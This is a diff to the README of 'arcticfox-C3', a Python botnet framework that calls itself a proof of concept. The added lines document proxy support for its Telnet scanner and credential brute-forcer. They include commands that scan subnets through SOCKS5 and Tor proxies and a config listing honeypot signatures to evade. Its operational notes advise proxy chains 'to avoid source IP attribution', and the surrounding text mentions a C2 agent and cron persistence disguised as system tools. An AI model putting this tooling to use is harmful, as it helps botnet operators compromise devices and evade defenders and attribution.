@@ -163,6 +163,12 @@ arcticfox-C3 is a proof-of-concept Python framework showing how modern botnets o
 - Configurable ports, timeouts, thread counts, rate limiting
 - Exclusion lists (skip CIDRs)
 - Output to file with structured results
+- **Proxy support** — route scans and brute-force through SOCKS5, SOCKS4, or HTTP CONNECT proxies
+  - Single proxy: `--proxy socks5://host:port`
+  - Proxy list with round-robin rotation: `--proxy-file proxies.txt`
+  - SOCKS5 authentication: `--proxy socks5://user:pass@host:port`
+  - Config file: `proxy_list` array in `oogascan.json`
+  - Zero external dependencies (built-in SOCKS5/4/HTTP CONNECT handshake)
 
 ---
 
@@ -281,6 +287,11 @@ curl -H "Authorization: Bearer $LINTS_TOKEN" \
 ```bash
 python3 oogascan.py scan -T 192.168.1.0/24
 python3 oogascan.py scan --scan-only --ports 23,2323
+
+# Scan through a proxy
+python3 oogascan.py scan -T 192.168.1.0/24 --proxy socks5://127.0.0.1:9050
+python3 oogascan.py scan --proxy socks5://user:pass@proxy.example.com:1080
+python3 oogascan.py scan --proxy-file proxies.txt   # round-robin rotation
 ```
 
 ---
@@ -385,6 +396,38 @@ Tokens auto-generate on first run if empty.
 }
 ```
 
+### oogascan.json (scanner config)
+
+```json
+{
+  "scan": {
+    "ports": [23, 2323],
+    "scan_timeout": 1.0,
+    "brute_timeout": 20,
+    "scanner_threads": 8,
+    "brute_threads": 8,
+    "rate_limit": 0,
+    "bypass_timeout": 15,
+    "honeypot_patterns": ["cowrie", "honeypot", "HoneyTel", "Kippo"],
+    "proxy_list": [
+      "socks5://127.0.0.1:9050",
+      "socks5://user:pass@proxy2.example.com:1080",
+      "http://proxy3.example.com:8080"
+    ]
+  },
+  "creds_file": "",
+  "output_dir": "output"
+}
+```
+
+Proxy formats supported in `proxy_list`:
+- `socks5://host:port` — SOCKS5 (no auth)
+- `socks5://user:pass@host:port` — SOCKS5 with authentication
+- `socks4://host:port` — SOCKS4
+- `http://host:port` — HTTP CONNECT tunnel
+
+When multiple proxies are configured, they are rotated round-robin across all scanner and brute-force threads.
+
 ### pb_config.json
 
 ```json
@@ -418,6 +461,7 @@ python3 api.py                     # API server
 python3 control.py                 # Operator control
 python3 pastebomb.py agent         # C2 agent
 python3 csan.py -T 10.0.0.0/24    # Scanner
+python3 csan.py --proxy socks5://127.0.0.1:9050  # Scanner via proxy
 ```
 
 ---
@@ -433,6 +477,8 @@ python3 csan.py -T 10.0.0.0/24    # Scanner
 - Cron persistence uses system-tool names to blend with legitimate entries
 - Bot ID files mimic system cache files
 - API tokens should be rotated regularly (`--gen-tokens`)
+- Scanner supports SOCKS5/SOCKS4/HTTP proxies — route scans through Tor or proxy chains to avoid source IP attribution
+- Use `--proxy-file` with multiple proxies for round-robin rotation across workers
 
 ---
 
